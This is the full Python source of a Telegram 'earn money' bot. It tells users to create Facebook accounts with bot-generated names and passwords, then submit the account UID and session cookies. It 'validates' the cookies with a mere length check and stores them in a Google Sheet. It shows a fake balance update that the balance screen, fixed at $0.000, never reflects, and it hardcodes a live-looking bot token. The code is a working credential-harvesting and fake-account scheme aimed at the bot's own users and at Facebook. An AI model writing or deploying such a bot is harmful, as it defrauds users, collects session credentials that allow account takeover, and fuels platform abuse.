import random
import string
from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, Update
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    CallbackQueryHandler,
    MessageHandler,
    ConversationHandler,
    filters,
)
import gspread
from oauth2client.service_account import ServiceAccountCredentials

# --- [GOOGLE SHEETS SETUP] ---
scope = ["https://spreadsheets.google.com/feeds", "https://www.googleapis.com/auth/drive"]
try:
    creds = ServiceAccountCredentials.from_json_keyfile_name("credentials.json", scope)
    client = gspread.authorize(creds)
    SPREADSHEET_NAME = "Daily Earn Bot Database"
except Exception as e:
    print(f"Google Sheet Auth Error: {e}")

def save_to_sheet(task_category, data_row):
    try:
        spreadsheet = client.open(SPREADSHEET_NAME)
        today_date = datetime.now().strftime("%Y-%m-%d")
        sheet_title = f"{task_category}_{today_date}"
        
        try:
            worksheet = spreadsheet.worksheet(sheet_title)
        except gspread.exceptions.WorksheetNotFound:
            worksheet = spreadsheet.add_worksheet(title=sheet_title, rows="1000", cols="10")
            worksheet.append_row(["Timestamp", "Telegram ID", "Username", "Submitted Data", "Status"])
            
        worksheet.append_row(data_row)
    except Exception as e:
        print(f"Sheet Save Error: {e}")

# --- [STATES] ---
WAITING_FOR_UID = 1
WAITING_FOR_COOKIES = 2

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        ["🚀 Start Work", "💰 Balance"],
        ["💸 Withdraw", "👥 Referrals"],
        ["🏆 Leaderboard", "📊 Statistics"],
        ["🎧 Support", "❓ Help"]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    user_name = update.effective_user.first_name
    await update.message.reply_text(f"Hello, {user_name}! 👋\n\nWelcome to the Task Bot. Choose an option below:", reply_markup=reply_markup)

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    
    if text == "🚀 Start Work":
        keyboard = [
            [InlineKeyboardButton("📁 Facebook Account (Cookies Only)", callback_data="fb_cookies_task")],
            [InlineKeyboardButton("❌ Cancel Process", callback_data="cancel")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("📌 Select a task category:", reply_markup=reply_markup)
        
    elif text == "💰 Balance":
        await update.message.reply_text("👤 Your Current Balance: $0.000\n✨ Complete tasks to earn more!")
        
    elif text == "💸 Withdraw":
        await update.message.reply_text("💳 Minimum withdraw is $1.00.\nPlease select your payment method (bKash/Nagad).")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "fb_cookies_task":
        rand_name = f"User_{random.randint(1000, 9999)}"
        rand_pass = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
        
        context.user_data['temp_name'] = rand_name
        context.user_data['temp_pass'] = rand_pass
        
        text = (
            f"📂 **Facebook Account (Cookies Only)**\n\n"
            f"👤 **Name:** {rand_name}\n"
            f"🔑 **Password:** {rand_pass}\n\n"
            f"1️⃣ Create a Facebook account using these details.\n"
            f"2️⃣ Click the button below to provide your account UID."
        )
        keyboard = [[InlineKeyboardButton("🆔 Submit UID ➡️", callback_data="submit_uid")], [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
        await query.message.edit_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="Markdown")
        
    elif query.data == "submit_uid":
        await query.message.reply_text("✍️ Please send your account UID now:")
        return WAITING_FOR_UID
        
    elif query.data == "cancel":
        await query.message.edit_text("❌ Process cancelled.")
        return ConversationHandler.END

async def receive_uid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_uid = update.message.text
    context.user_data['submitted_uid'] = user_uid
    
    await update.message.reply_text("✅ UID Saved.\n\n🍪 Please paste the Facebook Cookies:\n(Formats accepted: Netscape, JSON, or String)")
    return WAITING_FOR_COOKIES

async def receive_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cookies_data = update.message.text
    telegram_id = update.effective_user.id
    username = update.effective_user.username or "No Username"
    user_uid = context.user_data.get('submitted_uid', 'N/A')
    
    await update.message.reply_text("⏳ Checking Facebook cookies... Please wait.")
    
    # কুকিজ চেক করার সাধারণ কন্ডিশন (এখানে আপনি আপনার পছন্দমতো লজিক দিতে পারেন)
    if len(cookies_data) > 15:  
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        final_data = f"UID: {user_uid} | Cookies: {cookies_data}"
        
        # গুগল শিটে আজকের তারিখে ক্যাটাগরি অনুযায়ী সেভ হবে
        save_to_sheet("FB_Cookies", [timestamp, str(telegram_id), str(username), final_data, "Approved"])
        
        await update.message.reply_text("✅ Facebook Cookies Valid!\n🎉 Task completed successfully! Balance updated.")
    else:
        await update.message.reply_text("❌ Facebook Cookies Invalid or Expired!\nThe bot rejected the cookies.")
        
    return ConversationHandler.END

def main():
    TOKEN = "8980706201:AAHmK_q9vcStJiTbd-m1HGaDjbYhga3pfps"
    application = Application.builder().token(TOKEN).build()
    
    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^(fb_cookies_task|submit_uid)$")],
        states={
            WAITING_FOR_UID: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_uid)],
            WAITING_FOR_COOKIES: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_cookies)]
        },
        fallbacks=[CommandHandler("start", start)]
    )
    
    application.add_handler(CommandHandler("start", start))
    application.add_handler(conv_handler)
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("Bot is running smoothly...")
    application.run_polling()

if __name__ == "__main__":
    main()

